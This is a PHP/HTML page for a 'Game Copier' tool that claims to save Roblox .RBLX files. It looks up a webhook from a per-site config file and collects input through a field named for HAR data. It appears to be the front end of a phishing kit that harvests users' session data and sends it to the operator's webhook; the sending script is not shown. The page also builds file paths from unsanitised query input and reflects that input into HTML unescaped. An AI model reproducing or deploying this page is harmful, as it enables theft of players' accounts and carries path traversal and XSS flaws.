<?php
$siteName = $_GET["name"];
$authFilePath = __DIR__ . '/../../auth/' . $siteName . '.json';
if (!file_exists($authFilePath)) {
    http_response_code(404);
    echo 'Site not found.';
    exit();
}
$jsonData = json_decode(file_get_contents($authFilePath), true);
$webhook = $jsonData['webhook'] ?? null;
if (!$webhook) {
    http_response_code(400);
    echo 'Invalid configuration.';
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Copier</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf/notyf.min.css">
    <script src="https://cdn.jsdelivr.net/npm/notyf/notyf.min.js"></script>
    <link rel="stylesheet" href="/css/main.css">
    <script src="/js/main.js" defer></script>
</head>
<body>
    <div class="navbar">
        <div class="logo"></div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Features</a>
            <a href="#">About Us</a>
        </div>
    </div>
    <div class="container">
        <div class="logo">Game Copier</div>
        <p class="description">
            The .RBLX File will be saved upon Completion.
        </p>
        <div class="form">
            <input type="hidden" id="secret" value="<?=$siteName;?>"></label>
            <input type="text" placeholder="Game Code" id="har-copy-input">
            <button id="har-copy-begin">Begin Copy</button>
        </div>
    </div>
    <br>
    </br>
    <div class="container">
        <div class="logo">Tutorial</div>
        <div class="form">
            <div class="video-showcase">
                <br>
                    <video controls width="100%" src="/media/copier.mp4"></video>
                </br>
            </div>
        </div>
    </div>
</body>
</html>